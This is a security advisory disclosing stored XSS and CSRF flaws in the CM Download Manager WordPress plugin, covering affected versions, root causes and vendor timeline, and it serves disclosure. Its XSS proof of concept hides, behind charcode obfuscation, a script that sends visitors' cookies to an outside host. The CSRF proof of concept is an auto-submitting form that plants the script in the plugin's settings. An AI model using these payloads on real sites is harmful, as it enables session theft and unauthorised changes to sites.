Subject: CVE-2014-9129: XSS and CSRF in CM Download Manager plugin for
 WordPress

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

Product: WordPress plugin cm-download-manager
Plugin page: https://wordpress.org/plugins/cm-download-manager/
Vendor: CreativeMindsSolutions http://cminds.com/
Vulnerability Type: CWE-79: Cross-site scripting
Vulnerable Versions: 2.0.6 and below
Fixed Version: 2.0.7
Solution Status: Fixed by Vendor
Vendor Notification: 2014-11-27
Public Disclosure: 2014-12-02
CVE Reference: N/A. Only assigned for CSRF
Criticality: Low

Vulnerability details:

CM Download Manager plugin for WordPress contains a flaw that allows a stored
cross-site scripting (XSS) attack. This flaw exists because the
/wp-admin/admin.php script does not validate input to the 'addons_title' POST
parameter before returning it to users. This allows an authenticated remote
attacker to create a specially crafted request that would execute arbitrary
script code in a user's browser session within the trust relationship between
their browser and the server.

Root cause:

The software incorrectly neutralizes user-controllable input before it is placed
in output that is used as a web page that is served to authenticated users.

Proof-of-concept:

Insert following code to CM Downloads -> Settings -> "Downloads listing title"
field with CSRF attack.

<script>var foo = String.fromCharCode(60, 115, 99, 114, 105, 112, 116, 62, 110,
101, 119, 32, 73, 109, 97, 103, 101, 40, 41, 46, 115, 114, 99, 61, 34, 104, 116,
116, 112, 58, 47, 47, 98, 117, 103, 115, 46, 102, 105, 47, 99, 111, 111, 107,
105, 101, 46, 112, 104, 112, 63, 105, 100, 61, 34, 43, 100, 111, 99, 117, 109,
101, 110, 116, 46, 99, 111, 111, 107, 105, 101, 59, 60, 47, 115, 99, 114, 105,
112, 116, 62);document.write(foo);</script>

Plugin page: https://wordpress.org/plugins/cm-download-manager/
Vendor: CreativeMindsSolutions http://cminds.com/
Vulnerability Type: CWE-352: Cross-Site Request Forgery
Vulnerable Versions: 2.0.6 and below
Fixed Version: 2.0.7
Solution Status: Fixed by Vendor
Vendor Notification: 2014-11-27
Public Disclosure: 2014-12-02
CVE Reference: CVE-2014-9129
Criticality: Low

Vulnerability details:

CM Download Manager plugin for WordPress contains a flaw on the
CMDM_admin_settings page as HTTP requests to /wp-admin/admin.php do not
require multiple steps, explicit confirmation, or a unique token when performing
sensitive actions. By tricking authenticated user into following a specially
crafted link, a context-dependent attacker can perform a CSRF attack causing the
victim to insert and execute arbitrary script code.

Root cause:

The web application does not sufficiently verify whether a well-formed, valid,
consistent request was intentionally provided by the user who submitted the
request.

Proof-of-concept:

<html><body><h3>https://example.org/wp-admin/admin.php?page=CMDM_admin_settings</h3>
<form id="f1" method="POST"
action="https://example.com/wp-admin/admin.php?page=CMDM_admin_settings">
<table><input type="text" name="addons_title" value="XSS"></table></form>
<script type="text/javascript">document.getElementById("f1").submit();</script>
</body></html>

Notes:

Other pages and/or parameters are also possibly insecure (not tested). Suggested
to do a proper security audit for their software. Vendor did not mention
security fix or CVE in ChangeLog even it was discussed several times. References
